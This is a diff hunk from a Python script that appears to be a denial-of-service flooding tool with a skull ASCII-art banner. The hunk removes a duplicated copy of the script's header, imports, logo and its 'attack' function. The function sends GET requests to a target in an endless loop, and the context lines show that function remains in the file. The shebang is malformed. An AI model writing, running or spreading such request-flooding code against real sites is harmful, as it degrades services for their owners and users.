@@ -55,63 +55,6 @@ def attack(target, message):
         except Exception as e:
             print("Failed to send request:", e)
         time.sleep(random.uniform(0.5, 2.0))  
-#!usr/bin/python3
-
-import requests
-import threading
-import argparse
-import os
-import subprocess
-import curses
-import random
-import time
-
-TARGET = ""
-
-LOGO = """
-
- ######   ####    ######   #### 
-     ##  #    #       ##  #    #
-     ##  #    #       ##  #    #
- #   ##  #    #  #    ##  #    #   
-  ####    ####    #####    ####  
-
-███████████████████████████
-███████▀▀▀░░░░░░░▀▀▀███████
-████▀░░░░░░░░░░░░░░░░░▀████
-███│░░░░░░░░░░░░░░░░░░░│███
-██▌│░░░░░░░░░░░░░░░░░░░│▐██
-██░└┐░░░░░░░░░░░░░░░░░┌┘░██
-██░░└┐░░░░░░░░░░░░░░░┌┘░░██
-██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
-██▌░│██████▌░░░▐██████│░▐██
-███░│▐███▀▀░░▄░░▀▀███▌│░███
-██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
-██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
-████▄─┘██▌░░░░░░░▐██└─▄████
-█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
-████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
-█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
-███████▄░░░░░░░░░░░▄███████
-██████████▄▄▄▄▄▄▄██████████
-███████████████████████████
-   
-
-
-
-
-
-
-"""
-
-def attack(target, message):
-    while True:
-        try:
-            response = requests.get(target)
-            print("Request sent to:", target)
-        except Exception as e:
-            print("Failed to send request:", e)
-        time.sleep(random.uniform(0.5, 2.0))  
 
 
 def main(stdscr):
